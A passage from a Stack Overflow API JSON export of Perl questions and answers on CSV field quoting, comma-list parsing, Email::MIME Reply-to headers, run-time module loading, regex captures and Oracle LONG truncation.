's/(\\$\\d+(?:,\\d{3})*(?:\\.\\d{2})?)/\"$1\"/g' input.csv  &gt; changed.csv\n</code></pre>\n\n<p>Add <code>-i</code> switch to overwrite input (\"<em>in-place</em>\"), or <code>-i.bak</code> to also keep backup.</p>\n\n<hr>\n\n<p>If you anticipate further need for tweaks, or to document this better, put it in a script</p>\n\n<pre><code>use warnings;\nuse strict;\n\nmy $file = '...';\nmy $fout = '...';\n\nopen my $fh,     '&lt;', $file or die \"Can't open $file: $!\";\nopen my $fh_out, '&gt;', $fout or die \"Can't open $fout for writing: $!\";\n\nwhile (my $line = &lt;$fh&gt;) {\n    $line =~ s/( \\$\\d+ (?:,\\d{3})* (?:\\.\\d{2})? )/\"$1\"/gx;\n    print fh_out $line;\n}\n\nclose $fh;\nclose $fh_out;\n</code></pre>\n"}], "owner": {"reputation": 79, "user_id": 884808, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/92e063b6e5b1f46725af6bfd870d11e4?s=128&d=identicon&r=PG", "display_name": "jb04", "link": "https://stackoverflow.com/users/884808/jb04"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 872, "favorite_count": 0, "accepted_answer_id": 41900821, "answer_count": 2, "score": 4, "last_activity_date": 1485811316, "creation_date": 1485541116, "last_edit_date": 1485548458, "question_id": 41900519, "link": "https://stackoverflow.com/questions/41900519/processing-csv-file-without-double-quotes", "title": "Processing CSV file without double quotes", "body": "<p></p>\n\n<p>In other words, I am looking for a way to ignore \", \" in one of the fields.</p>\n\n<p>The field should be treated as one single field even though it contains a comma.</p>\n\n<p>Example:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>Round,Winner,place,prize\n1,xyz,1,$4,500\n</code></pre>\n\n<p>If I read this with dict reader <code>$4,500</code> is printed as <code>$4</code> because <code>500</code> is considered to be another field., This makes sense as I am reading the file as comma delimited, so I can't really complain but try to figure out a work around.</p>\n\n<pre class=\"lang-python prettyprint-override\"><code>reader = csv.reader(f, delimiter=',', quotechar='\"')\n</code></pre>\n\n<p>My source is not wrapped in double quotes so I can't ignore by including a quote string.</p>\n\n<p>Is there any other way to handle this scenario? Probably something like define these dollar fields and make it ignore commas for that field? Or try to inserrt quotes around this field?</p>\n\n<p>If not Python, could shell script or Perl be used to do it?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "reply_to_user": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1485535787, "post_id": 41898876, "comment_id": 70980313, "body": "@MattJacob That will still split the function call into multiple fields since it&#39;s not quoted."}, {"owner": {"reputation": 434, "user_id": 2766918, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/b30ed3dc92a395952309d65497b3b872?s=128&d=identicon&r=PG&f=1", "display_name": "user2766918", "link": "https://stackoverflow.com/users/2766918/user2766918"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1485538204, "post_id": 41898876, "comment_id": 70981727, "body": "Yes, that&#39;s the problem.  I thought <code>extract_multiple</code> might do the trick, but I can&#39;t seem to get it working either."}], "answers": [{"comments": [{"owner": {"reputation": 434, "user_id": 2766918, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/b30ed3dc92a395952309d65497b3b872?s=128&d=identicon&r=PG&f=1", "display_name": "user2766918", "link": "https://stackoverflow.com/users/2766918/user2766918"}, "edited": false, "score": 0, "creation_date": 1485547250, "post_id": 41900583, "comment_id": 70986327, "body": "This looks like it will do what I want in a much neater way than I&#39;ve been using up until now.   I&#39;ll have to read up on it.  Thanks for pointing it out."}], "tags": [], "owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "is_accepted": true, "score": 3, "last_activity_date": 1485548254, "last_edit_date": 1485548254, "creation_date": 1485541348, "answer_id": 41900583, "question_id": 41898876, "link": "https://stackoverflow.com/questions/41898876/how-can-i-split-a-comma-separated-string-ignoring-commas-inside-double-quotes-a/41900583#41900583", "title": "How can I split a comma-separated string, ignoring commas inside double quotes and parentheses?", "body": "<p>You can do this with <a href=\"https://metacpan.org/pod/Parse::RecDescent\" rel=\"nofollow noreferrer\">Parse::RecDescent</a>, which lets you define a grammar for parsing:</p>\n\n<pre><code>use strict;\nuse warnings 'all';\nuse 5.010;\n\nuse Data::Dumper;\nuse Parse::RecDescent;\nuse Regexp::Common qw(balanced);\n\nmy $grammar = q{\n    # One or more fields, separated by commas\n    startrule     : field(s /,/)                                                        # / for broken Stack Overflow syntax highlighter\n\n    # A field can be a function call, a double-quoted string, or bare text\n    field         : func\n                  | quoted\n                  | bare\n\n    # A double-quoted string. Returned with quotes stripped\n    quoted        : /\"[^\"]*\"/\n                  {\n                      $item[-1] =~ s/\\A\"|\"\\z//g;                                        # / for broken Stack Overflow syntax highlighter\n                      $return = $item[-1]\n                  }\n\n    # \"Bare\" text: not a function call and not a quoted string. May contain\n    # spaces\n    bare          : /[^,]*/\n\n    # A function name\n    identifier    : /\\w+/\n};\n\n$grammar .= qq{\n    # A function call\n    func          : identifier /$RE{balanced}{-parens=&gt;'()'}/\n};\n\n$grammar .= q{\n                  { $return = join '', @item[1..$#item] }\n};\n\nmy $parser = Parse::RecDescent-&gt;new($grammar) or die 'Bad grammar';\n\nmy $parsed = $parser-&gt;startrule(\n    'one two, \"string with ,\", func(a,func2(1,2))'\n);\nprint Dumper $parsed;\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>$VAR1 = [\n          'one two',\n          'string with ,',\n          'func(a,func2(1,2))'\n        ];\n</code></pre>\n\n<p>Note that this does not handle quoted fields that contain escaped quotes, although that would be easy enough to add if you know which character is used for escaping.</p>\n"}], "owner": {"reputation": 434, "user_id": 2766918, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/b30ed3dc92a395952309d65497b3b872?s=128&d=identicon&r=PG&f=1", "display_name": "user2766918", "link": "https://stackoverflow.com/users/2766918/user2766918"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 727, "favorite_count": 1, "accepted_answer_id": 41900583, "answer_count": 1, "score": 4, "last_activity_date": 1485548254, "creation_date": 1485535357, "last_edit_date": 1485536657, "question_id": 41898876, "link": "https://stackoverflow.com/questions/41898876/how-can-i-split-a-comma-separated-string-ignoring-commas-inside-double-quotes-a", "title": "How can I split a comma-separated string, ignoring commas inside double quotes and parentheses?", "body": "<p>I want to split a comma-delimited parameter list into tokens, but I want to ignore the delimiter if inside double quotes or parentheses. For example:</p>\n\n<pre><code>my @arr = some_function('one, \"string with ,\", func(a,func2(1,2))');\n</code></pre>\n\n<p>should produce:</p>\n\n<pre><code>$arr[0] -&gt; one\n$arr[1] -&gt; \"string with ,\"\n$arr[2] -&gt; func(a,func2(1,2))\n</code></pre>\n\n<p>I know that I can ignore the commas inside quotes with <a href=\"https://metacpan.org/pod/Text::ParseWords\" rel=\"nofollow noreferrer\"><code>Text::ParseWords</code></a>, but that will still split <code>func(a,func2(1,2))</code> into multiple fields, since it's not quoted. Is there a clean way to do this, or do I have to write my own parser?</p>\n"}, {"tags": ["perl", "email"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1485535406, "post_id": 41898188, "comment_id": 70980060, "body": "Always <code>use strict;</code> and <code>use warnings &#39;all&#39;;</code>. That would have given you a pointer to the problem with your code: &#39;Bareword &quot;Reply&quot; not allowed while &quot;strict subs&quot; in use&#39;"}, {"owner": {"reputation": 21, "user_id": 7479589, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/82bbf662e188d4aab580dba4e308f31b?s=128&d=identicon&r=PG&f=1", "display_name": "Dave LeLacheur", "link": "https://stackoverflow.com/users/7479589/dave-lelacheur"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1485535656, "post_id": 41898188, "comment_id": 70980221, "body": "Thank you.  You are correct, and yes that didn&#39;t work.  How does one add a &quot;reply-to&quot; option is my question?"}, {"owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "edited": false, "score": 1, "creation_date": 1485592244, "post_id": 41898188, "comment_id": 70997402, "body": "@DaveLeLacheur: put it into quotes, i.e. <code>&#39;Reply-to&#39; =&gt; ....</code>."}, {"owner": {"reputation": 21, "user_id": 7479589, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/82bbf662e188d4aab580dba4e308f31b?s=128&d=identicon&r=PG&f=1", "display_name": "Dave LeLacheur", "link": "https://stackoverflow.com/users/7479589/dave-lelacheur"}, "edited": false, "score": 0, "creation_date": 1485789179, "post_id": 41898188, "comment_id": 71058708, "body": "Looks awesome Steffen.  Thank you !!!"}], "owner": {"reputation": 21, "user_id": 7479589, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/82bbf662e188d4aab580dba4e308f31b?s=128&d=identicon&r=PG&f=1", "display_name": "Dave LeLacheur", "link": "https://stackoverflow.com/users/7479589/dave-lelacheur"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 468, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1485533068, "creation_date": 1485533068, "question_id": 41898188, "link": "https://stackoverflow.com/questions/41898188/does-perl-module-emailmime-create-html-support-reply-to-option", "title": "Does Perl module Email::MIME-&gt;create_html support Reply-to option?", "body": "<p>I have been upgrading some Perl sendmail automated emails to take advantage of features with Email::MIME::CreateHTML and Email::Sender notably SMTP authentication.  It works fine.  </p>\n\n<pre><code>    use Email::Sender::Simple qw(sendmail);\n    use Email::Sender::Transport::SMTP ();\n    use Email::MIME::CreateHTML;\n\n    my $smtpserver = 'myserver.com';\n    my $smtpport = ###;\n    my $smtpuser   = 'noreply@mywebsite.com';\n    my $smtppassword = 'mypassword';\n\n    my $xport = Email::Sender::Transport::SMTP-&gt;new({\n      host =&gt; $smtpserver,\n      port =&gt; $smtpport,\n      ssl =&gt; 'ssl',\n      sasl_username =&gt; $smtpuser,\n      sasl_password =&gt; $smtppassword,\n    });\n    my $email = Email::MIME-&gt;create_html(\n      header =&gt; [\n        To      =&gt; $email_to_recipient,\n        From    =&gt; $email_from_person,\n        Subject =&gt; $email_subject_line,\n      ],\n      body =&gt; $email_body_code,\n    );\n    sendmail($email, { transport =&gt; $transport });\n</code></pre>\n\n<p>However, I have not been able to find anywhere in the documents how to add a Reply-to option.  Using sendmail it was as simple as adding another line:</p>\n\n<pre><code>    print SENDMAIL \"From: noreply\\@myserver.com\\n\"; \n    print SENDMAIL \"To: recipient@theirserver.com\";\n    print SENDMAIL \"Reply-to: replyhere@myserver.com\\n\";\n</code></pre>\n\n<p>Tried to sneak in:</p>\n\n<pre><code>    my $email = Email::MIME-&gt;create_html(\n      header =&gt; [\n        To      =&gt; $email_to_recipient,\n        From    =&gt; $email_from_person,\n        Reply-to   =&gt; $email_reply_to_person,\n        Subject =&gt; $email_subject_line,\n      ],\n      body =&gt; $email_body_code,\n    );\n    sendmail($email, { transport =&gt; $transport });\n</code></pre>\n\n<p>but the reply-to part was ignored. Any help would be appreciated.</p>\n"}, {"tags": ["perl", "perl-module"], "comments": [{"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 0, "creation_date": 1485528462, "post_id": 41895769, "comment_id": 70975366, "body": "Also see the <a href=\"https://metacpan.org/pod/perlrun#-m%5B-%5Dmodule\" rel=\"nofollow noreferrer\"><code>-M</code> switch in perlrun</a> switch to specify a module to load from the command line."}, {"owner": {"reputation": 19192, "user_id": 257635, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/El2tc.jpg?s=128&g=1", "display_name": "Chankey Pathak", "link": "https://stackoverflow.com/users/257635/chankey-pathak"}, "edited": false, "score": 4, "creation_date": 1485529330, "post_id": 41895769, "comment_id": 70976033, "body": "Why the downvotes? This actually is a good question."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "reply_to_user": {"reputation": 19192, "user_id": 257635, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/El2tc.jpg?s=128&g=1", "display_name": "Chankey Pathak", "link": "https://stackoverflow.com/users/257635/chankey-pathak"}, "edited": false, "score": 0, "creation_date": 1485536156, "post_id": 41895769, "comment_id": 70980564, "body": "@ChankeyPathak I don&#39;t know why either, but the <a href=\"https://stackoverflow.com/questions/tagged/perl\">perl</a> tag is one of the most consistently negative places on SO."}], "answers": [{"comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485588010, "post_id": 41896939, "comment_id": 70996479, "body": "But that&#39;s at run time, isn&#39;t it?"}], "tags": [], "owner": {"reputation": 19192, "user_id": 257635, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/El2tc.jpg?s=128&g=1", "display_name": "Chankey Pathak", "link": "https://stackoverflow.com/users/257635/chankey-pathak"}, "is_accepted": false, "score": 1, "last_activity_date": 1485529264, "creation_date": 1485529264, "answer_id": 41896939, "question_id": 41895769, "link": "https://stackoverflow.com/questions/41895769/how-to-refer-to-a-perl-module-whose-name-would-be-passed-at-run-time/41896939#41896939", "title": "how to refer to a perl module whose name would be passed at run time?", "body": "<p><a href=\"https://metacpan.org/pod/UNIVERSAL::require\" rel=\"nofollow noreferrer\">UNIVERSAL::require</a> is made for this purpose only.</p>\n\n<p><strong>Description:</strong> <code>require()</code> modules from a variable</p>\n\n<p><strong>Snippet:</strong></p>\n\n<pre><code>require UNIVERSAL::require;\n\nmy $module = $ARGV[0];\n$module-&gt;require or die $@;\n\nmy $require_return = $module-&gt;use(@imports) or die $@;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 1, "last_activity_date": 1485542353, "last_edit_date": 1485542353, "creation_date": 1485541312, "answer_id": 41900571, "question_id": 41895769, "link": "https://stackoverflow.com/questions/41895769/how-to-refer-to-a-perl-module-whose-name-would-be-passed-at-run-time/41900571#41900571", "title": "how to refer to a perl module whose name would be passed at run time?", "body": "<p>Normally, dynamically-loaded modules are loaded at run-time, so one would use one of the following:</p>\n\n<pre><code>my $module_path = $module_name;\n$module_path =~ s{::}{/}g;\n$module_path .= '.pm';\nrequire $module_path;\n</code></pre>\n\n<p>or</p>\n\n<pre><code>$module_name !~ /^\\w+(?:::\\w+)*\\z/\n   or die(\"Bad module name\\n\");\n\neval(\"use $module_name qw( ); 1\")\n   or die $@;\n</code></pre>\n\n<p>These don't import, since it doesn't make much sense to import at run-time. You want to import from the modules, which mean you really want to load the module at compile-time. The following is a convenient trick:</p>\n\n<pre><code>use if 1, $module_name, @imports;\n</code></pre>\n\n<p>You could also use either of the following:</p>\n\n<pre><code>BEGIN {\n   my $module_path = $module_name;\n   $module_path =~ s{::}{/}g;\n   $module_path .= '.pm';\n   require $module_path;\n   import $module_name @imports;\n}\n</code></pre>\n\n<p>or</p>\n\n<pre><code>BEGIN {\n   $module_name !~ /^\\w+(?:::\\w+)*\\z/\n      or die(\"Bad module name\\n\");\n\n   eval(\"use $module_name \\@imports; 1\")\n      or die $@;\n}\n</code></pre>\n\n<p>There are modules that can also help.</p>\n"}], "owner": {"reputation": 747, "user_id": 590222, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/fba5be60a41679337637cdfba23bb4b1?s=128&d=identicon&r=PG", "display_name": "justrajdeep", "link": "https://stackoverflow.com/users/590222/justrajdeep"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 75, "favorite_count": 0, "answer_count": 2, "score": 2, "last_activity_date": 1485542353, "creation_date": 1485525789, "question_id": 41895769, "link": "https://stackoverflow.com/questions/41895769/how-to-refer-to-a-perl-module-whose-name-would-be-passed-at-run-time", "title": "how to refer to a perl module whose name would be passed at run time?", "body": "<p>Is it possible to refer to a perl module whose name would be passed as a command line argument?</p>\n\n<p>I can do <code>use $ARGV[0]</code> to get the module but how do i refer to anything imported by <code>EXPORT_OK</code> in the module?</p>\n"}, {"tags": ["regex", "perl", "extract"], "answers": [{"comments": [{"owner": {"reputation": 507, "user_id": 3417549, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/3VOwl.jpg?s=128&g=1", "display_name": "titus.andronicus", "link": "https://stackoverflow.com/users/3417549/titus-andronicus"}, "edited": false, "score": 1, "creation_date": 1485524666, "post_id": 41895253, "comment_id": 70972717, "body": "Darn! So close. I swear, after X more years of practice I&#39;ll get these bloody regexes understood...!"}, {"owner": {"reputation": 377, "user_id": 6583638, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/1zobe.jpg?s=128&g=1", "display_name": "Flying_whale", "link": "https://stackoverflow.com/users/6583638/flying-whale"}, "reply_to_user": {"reputation": 507, "user_id": 3417549, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/3VOwl.jpg?s=128&g=1", "display_name": "titus.andronicus", "link": "https://stackoverflow.com/users/3417549/titus-andronicus"}, "edited": false, "score": 0, "creation_date": 1518778047, "post_id": 41895253, "comment_id": 84653664, "body": "@titus.andronicus, you can go on <a href=\"https://regex101.com/\" rel=\"nofollow noreferrer\">regex101.com</a> to test your regexes, it also gives you what&#39;s inside your capturing groups, it is really useful to help debugging regexes ;)"}], "tags": [], "owner": {"reputation": 3472, "user_id": 4990392, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/89acc35f0339a9c7e6ae36443a23e2d9?s=128&d=identicon&r=PG&f=1", "display_name": "Dada", "link": "https://stackoverflow.com/users/4990392/dada"}, "is_accepted": true, "score": 5, "last_activity_date": 1485524185, "creation_date": 1485524185, "answer_id": 41895253, "question_id": 41895173, "link": "https://stackoverflow.com/questions/41895173/extracting-specific-values-from-a-perl-regex/41895253#41895253", "title": "Extracting specific values from a Perl regex", "body": "<p>You were almost there.</p>\n\n<p>Just :<br>\n - capture the three digits by adding parenthesis around: <code>(\\d{3})</code><br>\n - don't capture <code>m|p</code> by adding <code>?:</code> after the parenthesis before it (<code>(?:m|p)</code>), or by using <code>[mp]</code> instead:  </p>\n\n<pre><code>^testImrr[a-zA-z_]+(\\d{3})_(off|[mp]\\d{3})$\n</code></pre>\n\n<p>And you'll get :</p>\n\n<pre><code>1=001 2=off\n1=000 2=m030\n1=231 2=p030\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 251, "user_id": 7095760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1075cc785326ad3cb890f95b3446009e?s=128&d=identicon&r=PG&f=1", "display_name": "SREagle", "link": "https://stackoverflow.com/users/7095760/sreagle"}, "is_accepted": false, "score": 2, "last_activity_date": 1485524430, "creation_date": 1485524430, "answer_id": 41895324, "question_id": 41895173, "link": "https://stackoverflow.com/questions/41895173/extracting-specific-values-from-a-perl-regex/41895324#41895324", "title": "Extracting specific values from a Perl regex", "body": "<p>You can capture both at once, e.g with</p>\n\n<pre><code>if ($str =~ /(\\d{3})_(off|(?:m|p)\\d{3})$/ ) {\n    print \"1=$1, 2=$2\".$/;\n}\n</code></pre>\n\n<p>You example has two capture groups as well (<code>off|(m|p)\\d{3}</code> and <code>m|p</code>). In case of you first filename, for the second capture group nothing is catched due to matching the other branch. For non-capturing groups use <code>(?:yourgroup)</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "is_accepted": false, "score": 1, "last_activity_date": 1485544726, "creation_date": 1485544726, "answer_id": 41901449, "question_id": 41895173, "link": "https://stackoverflow.com/questions/41895173/extracting-specific-values-from-a-perl-regex/41901449#41901449", "title": "Extracting specific values from a Perl regex", "body": "<p>There's really no need for regular expressions when a simple <a href=\"http://perldoc.perl.org/functions/split.html\" rel=\"nofollow noreferrer\"><code>split</code></a> and <a href=\"http://perldoc.perl.org/functions/substr.html\" rel=\"nofollow noreferrer\"><code>substr</code></a> will suffice:</p>\n\n<pre><code>use strict;\nuse warnings;\n\nwhile (&lt;DATA&gt;) {\n    chomp;\n    my @fields = split(/_/);\n    my $digits = substr($fields[1], -3);\n\n    print \"1=$digits 2=$fields[2]\\n\";\n}\n\n__DATA__\ntestImrrFoo_Bar001_off\ntestImrrFooBar_bar000_m030\ntestImrrFooBar_bar231_p030\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>1=001 2=off\n1=000 2=m030\n1=231 2=p030\n</code></pre>\n"}], "owner": {"reputation": 507, "user_id": 3417549, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/3VOwl.jpg?s=128&g=1", "display_name": "titus.andronicus", "link": "https://stackoverflow.com/users/3417549/titus-andronicus"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 127, "favorite_count": 0, "accepted_answer_id": 41895253, "answer_count": 3, "score": 0, "last_activity_date": 1485544726, "creation_date": 1485523922, "question_id": 41895173, "link": "https://stackoverflow.com/questions/41895173/extracting-specific-values-from-a-perl-regex", "title": "Extracting specific values from a Perl regex", "body": "<p>I want to use a Perl regex to extract certain values from file names.\nThey have the following (valid) names:</p>\n\n<pre><code>testImrrFoo_Bar001_off\ntestImrrFooBar_bar000_m030\ntestImrrFooBar_bar231_p030\n</code></pre>\n\n<p>From the above I would like to extract the first 3 digits (always guaranteed to be 3), and the last part of the string, after the last <code>_</code> (which is either <code>off</code>, or (<code>m</code> or<code>p</code>) followed by 3 digits). So the first thing I would be extracting are 3 digits, the second a string.</p>\n\n<p>And I came out with the following method (I realise this might be not the most optimal/nicest one):</p>\n\n<pre><code>my $marker = '^testImrr[a-zA-z_]+\\d{3}_(off|(m|p)\\d{3})$';\nif ($str =~ m/$marker/)\n{\n    print \"1=$1 2=$2\";\n}\n</code></pre>\n\n<p>Where only <code>$1</code> has a valid result (namely the last bit of info I want), but <code>$2</code> turns out empty. Any ideas on how to get those 3 digits in the middle?</p>\n"}, {"tags": ["oracle", "perl"], "comments": [{"owner": {"reputation": 3105, "user_id": 4816207, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-jKNv2qYjH3g/AAAAAAAAAAI/AAAAAAAACnA/ZdLmPpJCAas/photo.jpg?sz=128", "display_name": "Prashant Pokhriyal", "link": "https://stackoverflow.com/users/4816207/prashant-pokhriyal"}, "edited": false, "score": 0, "creation_date": 1485529367, "post_id": 41894667, "comment_id": 70976058, "body": "Please add appropriate information. Your SQL query is also wrong."}], "answers": [{"tags": [], "owner": {"reputation": 7502, "user_id": 6368697, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yq4cG.jpg?s=128&g=1", "display_name": "Patrick Mevzek", "link": "https://stackoverflow.com/users/6368697/patrick-mevzek"}, "is_accepted": false, "score": 0, "last_activity_date": 1485636278, "creation_date": 1485636278, "answer_id": 41914652, "question_id": 41894667, "link": "https://stackoverflow.com/questions/41894667/not-able-to-get-an-entire-string-from-oracle-db-through-perl-script/41914652#41914652", "title": "Not able to get an entire string from oracle DB through perl script", "body": "<p>Do you have the same errors when using <code>DBI</code> directly ?\nIn any cases, without seeing the code of <code>SQL_Exec</code> and <code>SQL_Fetch</code> it is hard to debug your problem.\nThe result you quote is specifically 80 characters long, which may not be a coincidence.</p>\n"}], "owner": {"reputation": 19, "user_id": 6076762, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/dbf70be52c927c14377b15432dd6273e?s=128&d=identicon&r=PG&f=1", "display_name": "Venkatesh k", "link": "https://stackoverflow.com/users/6076762/venkatesh-k"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 41, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1485636278, "creation_date": 1485522376, "last_edit_date": 1485531209, "question_id": 41894667, "link": "https://stackoverflow.com/questions/41894667/not-able-to-get-an-entire-string-from-oracle-db-through-perl-script", "title": "Not able to get an entire string from oracle DB through perl script", "body": "<p>In my perl script I'm fetching records from oracle <code>DB.column:SQL_STATUS_INFO</code> with data type LONG.</p>\n\n<pre><code>$sql_statement = \"select SQL_STATEMENT\";\n$sql_statement .= \" from SQL_STATUS_INFO\";\n\nmy $sql_return = SQL_Exec($sql_statement);\nmy $DbRtn_DB = SQL_Fetch();\n\nforeach my $fromdb (@{$DbRtn_DB}) {\n    printf \"SQL_STATEMENT  :@{$fromdb}[0]\\n\";\n}\n</code></pre>\n\n<p><code>SQL_Exec</code>,<code>SQL_Fetch</code> are from perl module for executing the statements and fetching the results.</p>\n\n<p>In the table <code>SQL_STATUS_INFO</code>, I have below data in column <code>SQL_STATEMENT</code>.</p>\n\n<pre><code>CREATE TABLE \"ECLIPSFILE_4G_DUMMY_TRNX\" (ENBID VARCHAR2(30 CHAR),MCC NUMBER(38),MNC NUMBER,MNCLENGTH NUMBER,CELL_IDNUMBER(38),EARFCNDL NUMBER,PHYSICALID)\n</code></pre>\n\n<p>While fetching it through above script, I was not able to get the entire statement into <code>$DbRtn_DB</code>.</p>\n\n<p>The output I am getting when I ran above script is:</p>\n\n<pre><code>CREATE TABLEECLIPSFILE_4G_DUMMY_TRNX (ENBID VARCHAR2(30 CHAR),MCC NUMBER(38),MNC\n</code></pre>\n\n<p>So, I am not able to get the entire statement.</p>\n\n<p>But I am able to insert the big text into db. I tried the above SQL statement in SQL_DEVELOPER and there it is giving me the entire string as output but not through the perl script.</p>\n\n<p>How can I get that entire string into my perl variable.</p>\n"}, {"tags": ["perl", "daemon"], "answers": [{"comments": [{"owner": {"reputation": 85, "user_id": 2925636, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/955d09682ccc3c227dc9814f44139921?s=128&d=identicon&r=PG&f=1", "display_name": "AlanDev1989", "link": "https://stackoverflow.com/users/2925636/alandev1989"}, "edited": false, "score": 0, "creation_date": 1486132270, "post_id": 41892933, "comment_id": 71227055, "body": "Thank you, this was the issue that was stopping the file from being run anywhere!"}], "tags": [], "owner": {"reputation": 251, "user_id": 7095760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1075cc785326ad3cb890f95b3446009e?s=128&d=identicon&r=PG&f=1", "display_name": "SREagle", "link": "https://stackoverflow.com/users/7095760/sreagle"}, "is_accepted": true, "score": 0, "last_activity_date": 1485516447, "creation_date": 1485516447, "answer_id": 41892933, "question_id": 41892720, "link": "https://stackoverflow.com/questions/41892720/run-perl-code-which-includes-file-paths-from-anywhere/41892933#41892933", "title": "Run Perl Code (which includes file paths) from anywhere", "body": "<p>It seems you didn't create the 'pid' subdirectory when trying to use <code>pwd</code>. Create it before trying to create the pid file.</p>\n\n<p>Also: Please use lexical file handles and the 3-argument form of open: <code>open (my $fh, '&gt;', $filename)</code> instead of GLOBs (<code>FILE</code>) and <code>'&gt;filename.pid'</code></p>\n"}, {"tags": [], "owner": {"reputation": 403, "user_id": 7349485, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lzfEj.jpg?s=128&g=1", "display_name": "carlosn", "link": "https://stackoverflow.com/users/7349485/carlosn"}, "is_accepted": false, "score": 1, "last_activity_date": 1485518717, "creation_date": 1485518717, "answer_id": 41893607, "question_id": 41892720, "link": 